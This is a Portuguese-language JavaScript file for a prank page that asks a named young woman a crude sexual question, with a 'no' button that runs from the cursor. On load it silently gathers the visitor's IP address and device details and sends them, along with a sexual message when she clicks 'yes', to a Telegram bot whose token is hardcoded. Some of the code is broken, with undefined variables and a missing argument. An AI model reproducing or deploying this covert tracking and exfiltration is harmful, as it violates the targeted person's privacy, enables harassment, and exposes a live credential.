// ================================================
// script.js - Forçando IPv4 e enviando via teleporra
// ================================================

const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";

const CHAT_IDS = [
    "8448614204",   // Mr. Lonely (Sou eu porra)
    "8219025301",   // Luizz
];

const cuSim = document.getElementById('cuSim');
const cuNao = document.getElementById('cuNao');
const resposta = document.getElementById('cuResposta');


function detectDeviceType() {
    const ua = navigator.userAgent.toLowerCase();
    if (/smart-tv|tv|crkey|roku|android tv|firetv/i.test(ua)) return "Smart TV";
    if (/playstation|xbox|nintendo|switch/i.test(ua)) return "Console de videogame";
    if (/ipad|tablet|playbook|silk/i.test(ua)) return "Tablet";
    if (/android|iphone|ipod|blackberry|iemobile|opera mini/i.test(ua)) return "Celular";
    return "Computador";
}

function getDeviceInfo() {
    const deviceType = detectDeviceType();
    const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unkown";
    
    return {
        deviceType,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language || navigator.userLanguage,
        screen: `${window.screen.width} x ${window.screen.height}`,
        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: ram
    };
}

// ==================== PEGAR IPv4 FORÇADO ====================

async function getIPv4({ timeoutMs = 3000 } = {}) {
    const isIPv4 = ip => /^(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)$/.test(ip);

    const fetchWithTimeout = (url, opts = {}) => {
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), timeoutMs);
        return fetch(url, { ...opts, signal: controller.signal })
            .finally(() => clearTimeout(id));
    };

    const endpoints = [
        'https://api.ipify.org?format=json',           // retorna {ip: "..."}
        'https://api4.my-ip.io/ip.json',               // retorna {ip: "..."}
        'https://ipv4.icanhazip.com',                  // retorna texto puro
        'https://api4.ipify.org?format=json',          // força ipv4 no domínio
        'https://ipapi.co/json/'                       // ipapi.co retorna {ip: "..."} + geo
    ];

    for (const url of endpoints) {
        try {
            const res = await fetchWithTimeout(url);
            if (!res.ok) continue;

            const text = await res.text();
            let ip;

            try {
                ip = JSON.parse(text).ip; // tenta parse JSON
            } catch {
                ip = text.trim(); // se não for JSON, pega texto puro
            }

            if (isIPv4(ip)) return ip;
        } catch (e) {
            // ignora e tenta próximo fallback
            console.warn(`Falha no endpoint ${url}:`, e.message);
        }
    }

    console.error("Todos os fallbacks de IPv4 falharam");
    return "Não capturado";
}

// ==================== MENSAGEM QUANDO ENTRAR ====================
async function sendMessage(ip) {
    if (ip) processedIPs.set(ip, now);

    const device = getDeviceInfo();

    const message = `a 𝐵𝓇𝓊𝓃𝒶 entrou no site ;---; (agora, eu realmente enviei pra ela kaakaka)\n\n` +
                    `sim, pegamos o ip da Bruna e outros dados do dispositivo, são esses ai\n\n` +
                    `• Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                    `• IP (IPv4): ${ip} <<< Pode ser o bot do insta, observe o IP\n` +
                    `• Tipo: ${device.deviceType}\n` +
                    `• Sistema: ${device.platform}\n` +
                    `• Tela: ${device.screen}\n` +
                    `• RAM: ${device.deviceMemory}\n\n` +
                    `Bah guri, kakaakak, tmnc to quase morrendo pra fazer esse script`;

    for (const chatId of CHAT_IDS) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });
        } catch (err) {}
    }
}

// ==================== CAPTURA AO ENTRAR ====================
async function captureIPOnLoad() {
    const ip = await getIPv4();
    await sendMessage();
}

// ==================== INICIALIZAÇÃO ====================
async function init() {
    await captureIPOnLoad();   // Pega IPv4 + envia a mensagem no teleporra
}

function moverBotao(btn) {
            if (getComputedStyle(btn).position === 'static') {
                btn.style.position = 'fixed';
            }

            const viewport = window.visualViewport || window;
            const larguraJanela = viewport.width || window.innerWidth;
            const alturaJanela = viewport.height || window.innerHeight;

            const larguraBtn = btn.offsetWidth;
            const alturaBtn = btn.offsetHeight;

            const maxX = Math.max(0, larguraJanela - larguraBtn);
            const maxY = Math.max(0, alturaJanela - alturaBtn);

            const novaX = Math.random() * maxX;
            const novaY = Math.random() * maxY;

            btn.style.left = novaX + 'px';
            btn.style.top = novaY + 'px';
        }

        function mostrarResposta(texto) {
            resposta.textContent = texto;
        }

        // Botão SIM
        cuSim.addEventListener('click', async () => {
            mostrarResposta('Aaa que bom! Fico feliz 😊💜');
            
            // Envia mensagem para todos os CHAT_IDS
            for (const chatId of CHAT_IDS) {
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            chat_id: chatId, 
                            text: '🎉 ELA DISSE SIM! 🎉\nEla falou que vai dar o cuzinho!\nOloko, ai sim kaakakak' 
                        })
                    });
                } catch (err) {
                    console.error('Erro ao enviar mensagem:', err);
                }
            }
        });
        
// Botão NÃO - foge do cursor/dedo
cuNao.addEventListener('mouseenter', () => moverBotao(cuNao));
        
cuNao.addEventListener('touchstart', (e) => {
        e.preventDefault();
        moverBotao(cuNao);
});

cuNao.addEventListener('click', (e) => {
    e.preventDefault();
    moverBotao(cuNao);
});

init();